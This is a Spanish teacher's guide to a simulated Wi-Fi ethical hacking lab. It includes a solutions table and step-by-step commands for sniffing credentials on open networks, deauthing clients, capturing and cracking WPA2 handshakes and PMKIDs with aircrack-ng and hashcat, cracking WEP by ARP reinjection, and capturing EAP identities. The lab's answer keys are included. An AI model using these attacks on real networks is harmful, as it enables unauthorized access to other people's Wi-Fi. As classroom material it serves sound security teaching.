# Guía del profesor — Laboratorio Wi-Fi (Hacking Ético)

> **DOCUMENTO SOLO PARA EL PROFESOR.** Contiene las claves y la resolución
> completa de cada escenario. No lo repartas al alumnado: ellos tienen
> `guia_alumno.md`.

> **Entorno 100 % virtualizado.** Todas las radios son simuladas con
> `mac80211_hwsim` y aisladas en *network namespaces*. No hay emisión por
> radio real: las prácticas solo funcionan contra los APs de este laboratorio.
> **Uso exclusivamente educativo y en el aula.** Atacar redes reales sin
> autorización expresa por escrito es ilegal (en España, arts. 197 bis y 264
> del Código Penal).

---

## 0. Puesta en marcha

```bash
sudo ./despliegue.sh
```

El script instala lo que falte (`hostapd`, `hcxtools`, `pocl-opencl-icd`,
`ocl-icd-libopencl1`), levanta los 6 escenarios y, al terminar, imprime el
**SSID, canal y BSSID real** de cada uno (las claves no se muestran). Los BSSID
cambian en cada despliegue. Las interfaces de trabajo del alumno son
**`wlan0` … `wlan6`**.

Para desmontarlo todo: `sudo ./limpia.sh`.

### Poner una interfaz en modo monitor

```bash
sudo airmon-ng start wlan0 <canal>   # crea wlan0mon
# o, a mano:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**No uses `airmon-ng check kill`.** El script ya excluye las radios virtuales
de NetworkManager, así que no hay nada que matar. Además, `ip netns exec` no
aísla PIDs: `check kill` mataría los `wpa_supplicant` de los clientes del lab y
los escenarios se quedarían sin tráfico (hay que volver a desplegar).
`airmon-ng start` mostrará esos procesos como "could cause trouble": es solo un
aviso y se puede ignorar.

### Localizar objetivos y fijar canal

```bash
# Barrido general: anota BSSID y canal (CH)
sudo airodump-ng wlan0

# Fijar la interfaz al canal del objetivo (ej. canal 11)
sudo iw dev wlan0 set channel 11
```

---

## Soluciones

| SSID            | Ch | Seguridad   | Objetivo didáctico                         | Solución |
|-----------------|----|-------------|--------------------------------------------|----------|
| `he_open`       | 1  | Abierta     | Sniffing de tráfico en claro (HTTP POST)   | `user=admin&pass=SecretPass2026` |
| `he_wpa2`       | 6  | WPA2-PSK    | Captura del handshake 4-way + crackeo      | `chocolate` |
| `he_pmkid`      | 11 | WPA2-PSK    | PMKID **con** clientes asociados           | `dragonfly` |
| `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `marshmallow` |
| `he_enterprise` | 3  | WPA2-EAP    | EAP-PEAP / captura de reto MSCHAPv2        | Identidad `student_user@domain.lab` · tipo EAP 25 (PEAP) |
| `he_wep`        | 9  | WEP-104     | Recolección de IVs + reinyección ARP       | `ilovemyfamily` (hex `69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79`) |

Las tres claves WPA2 están en `rockyou.txt`. El password interno del cliente
Enterprise (`EnterprisePass2026`) **no** es un objetivo de la práctica: el
alumno solo debe identificar la identidad en claro y el método EAP.

---

## 1. `he_open` — Red abierta (tráfico en claro)

Un cliente envía un POST de login en bucle. El objetivo es demostrar que en una
red sin cifrado las credenciales viajan legibles.

```bash
sudo iw dev wlan0 set channel 1
sudo airodump-ng -c 1 --bssid <BSSID_OPEN> -w cap_open wlan0
# En otra terminal, filtrar el POST en la captura:
tshark -r cap_open-01.cap -Y 'http.request.method == "POST"' -T fields -e http.file_data
```

**Resultado esperado:** `user=admin&pass=SecretPass2026`.

**Aprendizaje:** cualquiera en la misma red abierta ve las credenciales.

---

## 2. `he_wpa2` — Handshake 4-way + crackeo offline

Hay dos clientes asociados.

### a) Capturar el handshake

```bash
sudo iw dev wlan0 set channel 6
sudo airodump-ng -c 6 --bssid <BSSID_WPA2> -w cap_wpa2 wlan0
```

### b) Forzar reconexión con un deauth (desde otra terminal)

```bash
sudo iw dev wlan1 set type monitor && sudo ip link set wlan1 up
sudo iw dev wlan1 set channel 6
sudo aireplay-ng -0 3 -a <BSSID_WPA2> wlan1
```

Cuando airodump muestre `WPA handshake: <BSSID>` arriba a la derecha, ya lo tienes.

### c) Crackear

```bash
# Con aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID_WPA2> cap_wpa2-01.cap

# O con hashcat (modo 22000)
hcxpcapngtool -o hash_wpa2.22000 cap_wpa2-01.cap
hashcat -m 22000 hash_wpa2.22000 /usr/share/wordlists/rockyou.txt
```

**Resultado esperado:** `chocolate`.

---

## 3. `he_pmkid` — PMKID **con** clientes

Hay una estación asociada generando tráfico. Sirve para contrastar las **dos
vías**: capturar el PMKID (campo del M1) o el handshake 4-way tras un deauth.

```bash
sudo iw dev wlan0 set channel 11

# Opción recomendada: hcxdumptool captura PMKID y handshakes a la vez
sudo hcxdumptool -i wlan0 -w pmkid_cli.pcapng --rds=1
# (Ctrl-C tras unos segundos)

# Extraer el hash 22000 (contiene líneas WPA*01=PMKID y WPA*02=handshake)
hcxpcapngtool -o hash_pmkid.22000 pmkid_cli.pcapng

# Crackear
hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
```

**Resultado esperado:** `dragonfly`.

---

## 4. `he_pmkid_nc` — PMKID **sin** clientes (*clientless*)

No hay ninguna estación asociada **a propósito**. Es el caso que demuestra por
qué el PMKID es peligroso: el AP incluye el PMKID en el **primer mensaje (M1)**
del 4-way durante la asociación, así que **no hace falta ningún cliente**:
basta con provocar uno mismo la asociación para que el AP emita ese M1.

```bash
sudo iw dev wlan0 set channel 4

# hcxdumptool fuerza la asociación contra el AP y recoge el PMKID solo
sudo hcxdumptool -i wlan0 -w pmkid_nc.pcapng --rds=1
# No aparecerá ningún cliente en airodump: el PMKID llega igual.

# Extraer y crackear
hcxpcapngtool -o hash_nc.22000 pmkid_nc.pcapng
hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
```

**Resultado esperado:** `marshmallow`.

**Comparación (respuesta a la pregunta de la guía del alumno):**

| | `he_pmkid` | `he_pmkid_nc` |
|---|---|---|
| Cliente conectado | Sí | No |
| ¿Hace falta esperar/deauth a un cliente? | Opcional | **No** |
| Material obtenible | PMKID **y** handshake | Solo PMKID |
| Lección | Dos vías de ataque | El PMKID no depende de clientes |

Fórmula: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)`. Como
depende de la MAC del atacante y no de la de un cliente legítimo, cualquiera
puede obtenerlo asociándose.

---

## 5. `he_enterprise` — WPA2-EAP (PEAP/MSCHAPv2)

```bash
sudo iw dev wlan0 set channel 3
sudo airodump-ng -c 3 --bssid <BSSID_ENT> -w cap_ent wlan0
```

Objetivo: observar el intercambio EAP-PEAP y comentar el vector de **Evil Twin /
RADIUS falso** (`hostapd-wpe`) para capturar el challenge/response MSCHAPv2 y
crackearlo con `asleap`. En este laboratorio basta con identificar la identidad
y el tipo de EAP en la captura:

```bash
tshark -r cap_ent-01.cap -Y eap -T fields -e eap.identity -e eap.type
```

**Resultado esperado:** identidad `student_user@domain.lab` (viaja en claro en
la fase externa) y tipo EAP 25 = PEAP.

---

## 6. `he_wep` — WEP (IVs + reinyección ARP)

Dos clientes generan ARP broadcast en bucle, ideal para la reinyección.

```bash
sudo iw dev wlan0 set channel 9

# Capturar IVs
sudo airodump-ng -c 9 --bssid <BSSID_WEP> -w cap_wep wlan0

# Reinyección ARP para acelerar la generación de IVs (otra terminal, wlan1 en
# monitor y en el canal 9)
sudo aireplay-ng -3 -b <BSSID_WEP> wlan1

# Crackear en cuanto haya ~20.000-40.000 IVs
aircrack-ng cap_wep-01.cap
```

**Resultado esperado:** `KEY FOUND! [ 69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79 ] (ASCII: ilovemyfamily)`.

El ataque PTW de aircrack es estadístico, no de diccionario: la clave se
recupera sea cual sea.

---

## Mantenimiento: cambiar las claves

- **WPA2:** las claves se guardan como PMK (64 hex) en `despliegue.sh`, en el
  `hostapd.conf` y en el `wpa.conf` de cada escenario. La PMK depende del SSID,
  así que se calcula para cada red:

  ```bash
  ./calculaPMK.py he_wpa2 <nueva_clave>
  ```

  Usa palabras de `rockyou.txt` de 8 a 63 caracteres.

- **WEP:** `wep_key0` en hex. Solo admite 5 o 13 caracteres ASCII (10 o 26 hex):

  ```bash
  printf 'ilovemyfamily' | od -An -tx1 | tr -d ' \n'
  ```

Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.

---

## Verificación y apagado

```bash
# Ver APs y namespaces activos
ip netns list
sudo ip netns exec ns_ap_pmkid_nc iw dev

# Apagar todo el laboratorio
sudo ./limpia.sh
```

---

## Herramientas usadas

- **aircrack-ng suite** (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
- **hcxdumptool / hcxpcapngtool** (captura y conversión de PMKID/handshake)
- **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL
- **tshark** (análisis de capturas)
